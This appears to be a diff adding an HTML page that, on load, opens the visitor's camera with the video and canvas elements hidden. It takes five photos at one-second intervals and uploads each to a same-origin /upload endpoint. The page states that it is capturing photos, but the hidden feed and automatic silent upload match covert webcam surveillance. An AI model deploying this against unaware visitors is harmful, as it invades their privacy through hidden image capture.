@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture Camera</title>
+    <style>
+        /* Hide video and canvas to prevent display */
+        #video, #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Auto Capture</h1>
+    <p>Capturing 5 photos automatically in the background...</p>
+
+    <!-- Hidden Video and Canvas Elements -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Capture 5 photos quickly (1 second apart)
+                let count = 0;
+                const captureInterval = setInterval(() => {
+                    if (count < 5) {
+                        capturePhoto();
+                        count++;
+                    } else {
+                        clearInterval(captureInterval); // Stop after 5 photos
+                        console.log("Photo capture complete!");
+                    }
+                }, 1000); // Capture every 1 second
+
+            } catch (error) {
+                console.error("Error accessing the camera:", error);
+            }
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to base64 and send to backend
+            const imageData = canvas.toDataURL('image/png');
+            uploadPhoto(imageData);
+        }
+
+        async function uploadPhoto(imageData) {
+            try {
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+
+                const result = await response.json();
+                console.log("Upload success:", result);
+            } catch (error) {
+                console.error("Upload failed:", error);
+            }
+        }
+
+        // Start camera on page load
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
